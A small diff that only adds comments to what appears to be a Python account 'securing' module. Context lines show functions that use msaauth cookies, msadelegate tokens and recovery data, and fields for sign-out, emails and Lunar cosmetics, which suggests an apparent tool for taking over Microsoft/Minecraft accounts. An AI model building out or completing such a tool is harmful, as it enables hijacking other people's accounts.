@@ -2,6 +2,8 @@ import asyncio
 from dataclasses import dataclass, field
 from typing import Any, Dict
 
+# importing all of the securing files
+
 from utils.timer import start_timer, stop_timer, millis_to_seconds
 from utils.logging import log
 from .tokens.cookies import get_cookies
@@ -56,6 +58,7 @@ import string
 import secrets
 import sys
 
+# checking settings to configure the secure
 
 @dataclass
 class Settings:
@@ -82,6 +85,7 @@ class Settings:
     windows_keys: int = 0
     oauths: int = 0
 
+# getting og info
 
 @dataclass
 class Ogi:
@@ -109,6 +113,7 @@ class Ogi:
     sign_out: str = "Failed"
     remaining_emails: str | None = None
 
+# getting lunar cosmetics/stats
 
 @dataclass
 class LunarMetadata:
@@ -126,6 +131,7 @@ class Lunar:
     equippedEmotes: list = field(default_factory=list)
     metadata: LunarMetadata = field(default_factory=LunarMetadata)
 
+# if any of the info doesn't return true or return ownership
 
 @dataclass
 class Account:
@@ -178,6 +184,8 @@ async def secure(client, msaauth: str, settings: Settings, recovery_data: Dict |
         return acc
 
     log("cookies fetched")
+
+# checking msauth for lock
 
     checked = check_msaauth(client, msaauth)
     if checked in {"locked", "down"}:
@@ -319,6 +327,8 @@ async def secure(client, msaauth: str, settings: Settings, recovery_data: Dict |
     log("getting amcjwt cookies")
     msadelegate_token = get_msadelegate(client)
     log("getting msadelegate token")
+
+# beginning the sequence of securing events from ./
 
     async def task_devices():
         try:
